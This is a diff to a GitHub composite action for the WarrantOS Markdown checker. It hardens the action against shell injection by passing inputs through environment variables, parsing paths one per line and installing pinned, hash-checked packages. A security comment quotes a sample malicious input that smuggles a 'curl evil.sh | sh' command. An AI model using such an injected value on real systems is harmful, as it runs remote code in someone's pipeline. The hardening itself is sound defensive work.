@@ -11,8 +11,10 @@ branding:
 inputs:
   paths:
     description: >-
-      Space-separated files or directories to scan. Directories are walked
-      for Markdown files in check mode; slop mode passes them through as-is.
+      Newline-delimited files or directories to scan (one path per line, so
+      filenames containing spaces are safe). Directories are walked for
+      Markdown files in check mode; slop mode passes them through as-is.
+      A blank value scans the current directory.
     required: false
     default: "."
   profile:
@@ -39,6 +41,19 @@ inputs:
     required: false
     default: "3.12"
 
+# Security posture of the run blocks below:
+#
+# 1. No `${{ inputs.* }}` interpolation inside any `run:` block. Every user
+#    input reaches the shell exclusively through `env:` variables and is
+#    expanded by bash with full quoting, so a malicious input value
+#    (`README.md; curl evil.sh | sh`) is only ever data, never code.
+# 2. `paths` is newline-delimited and parsed with `IFS= read -r`, so
+#    filenames containing spaces (or any character except newline) survive
+#    intact and multi-path inputs need no shell-sensitive separator.
+# 3. The install is hash-pinned: `pip install --require-hashes` against the
+#    committed action-requirements.txt (generated with pip-compile
+#    --generate-hashes), so a compromised or substituted PyPI artefact
+#    cannot execute in the consumer's workflow.
 runs:
   using: "composite"
   steps:
@@ -46,30 +61,57 @@ runs:
       with:
         python-version: ${{ inputs.python-version }}
 
-    - name: Install WarrantOS from PyPI
+    - name: Install WarrantOS from PyPI (version- and hash-pinned)
       shell: bash
-      run: python -m pip install --upgrade pip warrantos
+      run: |
+        set -euo pipefail
+        python -m pip install --require-hashes --requirement \
+          "${GITHUB_ACTION_PATH}/action-requirements.txt"
 
     - name: Run the slop gate (scaffold and conversational residue)
       if: ${{ inputs.mode == 'slop' || inputs.mode == 'both' }}
       shell: bash
-      run: warrantos slop ${{ inputs.paths }} --fail-over "${{ inputs.fail-over }}"
+      env:
+        WARRANTOS_INPUT_PATHS: ${{ inputs.paths }}
+        WARRANTOS_INPUT_FAIL_OVER: ${{ inputs.fail-over }}
+      run: |
+        set -euo pipefail
+        targets=()
+        while IFS= read -r p; do
+          [ -n "$p" ] || continue
+          targets+=("$p")
+        done <<< "$WARRANTOS_INPUT_PATHS"
+        if [ "${#targets[@]}" -eq 0 ]; then
+          targets=(".")
+        fi
+        warrantos slop "${targets[@]}" --fail-over "$WARRANTOS_INPUT_FAIL_OVER"
 
     - name: Run the full check pipeline (--ci exits non-zero on HOLD/BLOCK/NOT_ASSESSABLE)
       if: ${{ inputs.mode == 'check' || inputs.mode == 'both' }}
       shell: bash
+      env:
+        WARRANTOS_INPUT_PATHS: ${{ inputs.paths }}
+        WARRANTOS_INPUT_PROFILE: ${{ inputs.profile }}
       run: |
         set -uo pipefail
+        targets=()
+        while IFS= read -r p; do
+          [ -n "$p" ] || continue
+          targets+=("$p")
+        done <<< "$WARRANTOS_INPUT_PATHS"
+        if [ "${#targets[@]}" -eq 0 ]; then
+          targets=(".")
+        fi
         status=0
-        for p in ${{ inputs.paths }}; do
+        for p in "${targets[@]}"; do
           if [ -d "$p" ]; then
             while IFS= read -r -d '' f; do
               echo "::group::warrantos check $f"
-              warrantos check "$f" --profile "${{ inputs.profile }}" --ci || status=1
+              warrantos check "$f" --profile "$WARRANTOS_INPUT_PROFILE" --ci || status=1
               echo "::endgroup::"
             done < <(find "$p" -type f -name '*.md' -not -path '*/.*' -print0)
           else
-            warrantos check "$p" --profile "${{ inputs.profile }}" --ci || status=1
+            warrantos check "$p" --profile "$WARRANTOS_INPUT_PROFILE" --ci || status=1
           fi
         done
         exit "$status"
